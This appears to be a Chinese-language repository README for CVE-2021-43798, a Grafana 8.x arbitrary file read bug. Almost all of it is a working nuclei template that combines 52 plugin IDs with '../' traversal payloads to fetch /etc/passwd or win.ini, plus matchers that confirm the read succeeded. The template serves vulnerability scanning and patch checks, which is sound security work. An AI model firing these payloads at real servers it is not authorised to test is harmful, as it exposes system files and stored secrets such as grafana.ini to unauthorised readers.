# CVE-2021-43798:Grafana 任意文件读取漏洞

添加了 Windows+Linux 全版本识别的 nuclei 模板

52个插件列表：
```
live
icon
loki
text
logs
news
stat
mssql
mixed
mysql
tempo
graph
gauge
table
debug
zipkin
jaeger
geomap
canvas
grafana
welcome
xychart
heatmap
postgres
testdata
opentsdb
influxdb
barchart
annolist
bargauge
graphite
dashlist
piechart
dashboard
nodeGraph
alertlist
histogram
table-old
pluginlist
timeseries
cloudwatch
prometheus
stackdriver
alertGroups
alertmanager
elasticsearch
gettingstarted
state-timeline
status-history
grafana-clock-panel
grafana-simple-json-datasource
grafana-azure-monitor-datasource
```

# nuclei-yaml模板

```yaml
id: grafana-file-read

info:
  name: Grafana v8.x Arbitrary File Read
  author: z0ne,dhiyaneshDk
  severity: high
  reference:
    - https://nosec.org/home/detail/4914.html
    - https://github.com/jas502n/Grafana-VulnTips
    - https://twitter.com/pyn3rd/status/1468138032477859841
    - https://twitter.com/naglinagli/status/1468155313182416899
  tags: grafana,lfi
  remediation: The latest Grafana unpatched 0 Day LFI  is now being actively exploited, it affects only Grafana 8.0+, Vulnerable companies should revoke the secrets they store at their /etc/grafana/grafana.ini ASAP as there is no official fix in the meantime.

requests:
  - method: GET
    path:
      - "{{BaseURL}}/public/plugins/{{plugin-id}}/{{read-file}}"

    payloads:
      read-file:
        - ../../../../../../../../etc/passwd
        - ../../../../../../../../c:/windows/win.ini
        - ..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd
        - ..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fc:/windows/win.ini

      plugin-id:
        - live
        - icon
        - loki
        - text
        - logs
        - news
        - stat
        - mssql
        - mixed
        - mysql
        - tempo
        - graph
        - gauge
        - table
        - debug
        - zipkin
        - jaeger
        - geomap
        - canvas
        - grafana
        - welcome
        - xychart
        - heatmap
        - postgres
        - testdata
        - opentsdb
        - influxdb
        - barchart
        - annolist
        - bargauge
        - graphite
        - dashlist
        - piechart
        - dashboard
        - nodeGraph
        - alertlist
        - histogram
        - table-old
        - pluginlist
        - timeseries
        - cloudwatch
        - prometheus
        - stackdriver
        - alertGroups
        - alertmanager
        - elasticsearch
        - gettingstarted
        - state-timeline
        - status-history
        - grafana-clock-panel
        - grafana-simple-json-datasource
        - grafana-azure-monitor-datasource

    stop-at-first-match: true
    matchers-condition: and
    matchers:

      - type: regex
        regex:
          - "root:.*:0:0"
          - "for 16-bit app support"

      - type: status
        status:
          - 200
```
